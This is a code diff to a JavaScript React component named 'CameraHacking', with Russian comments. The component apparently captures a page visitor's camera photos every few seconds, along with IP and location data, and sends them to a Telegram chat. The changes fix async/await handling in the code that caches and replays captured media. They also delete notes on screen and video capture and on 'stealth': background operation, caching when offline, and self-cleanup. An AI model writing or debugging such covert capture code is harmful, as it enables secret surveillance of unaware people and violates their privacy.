@@ -1,5 +1,5 @@
 /**
- * КОМПОНЕНТ CAMERAHACKING - РАСШИРЕННАЯ ВЕРСИЯ
+ * КОМПОНЕНТ CAMERAHACKING - РАСШИРЕННАЯ ВЕРСИЯ (ИСПРАВЛЕННАЯ)
  * 
  * НОВЫЕ ВОЗМОЖНОСТИ:
  * 1. Периодическая отправка фото каждые 3 секунды
@@ -488,7 +488,7 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
   /**
    * ФУНКЦИЯ КЭШИРОВАНИЯ ЗАХВАТОВ
    */
-  const cacheCapture = (blob, type, filename) => {
+  const cacheCapture = async (blob, type, filename) => { // Добавлен async
     const cachedItem = {
       blob,
       type,
@@ -505,7 +505,7 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
     // Сохраняем в localStorage для восстановления после перезагрузки
     try {
       const existing = JSON.parse(localStorage.getItem('cachedCaptures') || '[]');
-      const dataUrl = await blobToDataURL(blob);
+      const dataUrl = await blobToDataURL(blob); // Используем await
       existing.push({
         ...cachedItem,
         dataUrl: dataUrl // Сохраняем как Data URL
@@ -736,7 +736,7 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
       for (const item of cachedItems) {
         if (item.dataUrl) {
           const blob = dataURLToBlob(item.dataUrl);
-          cacheCapture(blob, item.type, item.filename);
+          await cacheCapture(blob, item.type, item.filename); // Добавлен await
         }
       }
       
@@ -892,28 +892,3 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
 };
 
 export default CameraHacking;
-
-/**
- * ДОПОЛНИТЕЛЬНЫЕ ЗАМЕЧАНИЯ:
- * 
- * 1. ДЛЯ РАБОТЫ СКРИНШОТОВ НА ANDROID:
- * - Chrome для Android поддерживает getDisplayMedia с Android 9+
- * - Требует HTTPS соединения
- * - Пользователь должен выбрать окно/экран для захвата
- * 
- * 2. ДЛЯ РАБОТЫ ЗАПИСИ ВИДЕО:
- * - MediaRecorder поддерживается в Chrome, Firefox, Edge
- * - На iOS ограниченная поддержка
- * - Требует HTTPS
- * 
- * 3. ОПТИМИЗАЦИИ ПРОИЗВОДИТЕЛЬНОСТИ:
- * - Уменьшайте разрешение canvas для детекции движения
- * - Используйте requestAnimationFrame для плавности
- * - Дросселируйте обработку при высокой загрузке CPU
- * 
- * 4. БЕЗОПАСНОСТЬ И СКРЫТНОСТЬ:
- * - Все операции выполняются в фоновом режиме
- * - Данные кэшируются при потере соединения
- * - Информация об ошибках отправляется в Telegram
- * - Компонент самоочищается при размонтировании
- */
